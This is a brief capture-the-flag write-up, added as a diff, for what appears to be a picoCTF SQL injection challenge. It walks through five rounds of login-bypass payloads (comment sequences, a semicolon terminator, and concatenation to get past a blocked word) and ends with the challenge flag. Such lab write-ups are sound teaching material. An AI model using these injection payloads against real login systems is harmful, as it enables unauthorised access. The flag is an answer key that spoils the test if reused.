@@ -1,0 +1,33 @@
+#ROUND 1/5
+
+# WHEN WE TRY LOGGING IN AS " admin" and a random password we are not able to but instaed we get this:
+SELECT * FROM users WHERE username='admin' ' AND password='pass
+
+# so we use "admin'--" as username.
+#Whatever that is after “–” is commented so it will be ignored and what the query now does is it selects all users with the username admin
+
+#ROUND 2/5
+
+#In next round since we cannot use --, instead we use  /**/
+SELECT * FROM users WHERE username='admin' /*' AND password='pass'
+
+#ROUND 3/5
+#In this round i can still use /* however i am not able to login
+#So I try ; after admin because ; ends the SQL statement and everything after it is either an error or another statement
+
+SELECT * FROM users WHERE username='admin';' AND password='pass' 
+
+#ROUND 4/5
+#For next round we cannot use the word admin to login
+#so we can use || to write the word admin followed by ;
+# "||" concatenates the ad with the min, making it admin, and finishes the statement at the ;.
+
+SELECT * FROM users WHERE username='ad'||'min';' AND password='pass' 
+
+#ROUND 5/5
+# we again repeat the steps of previous round 
+
+Congrats! You won! Check out filter.php
+
+#when we check filter.php we get the req flag
+picoCTF{y0u_m4d3_1t_d846125f7bdbf4d6e89cbc5edb6fa739}
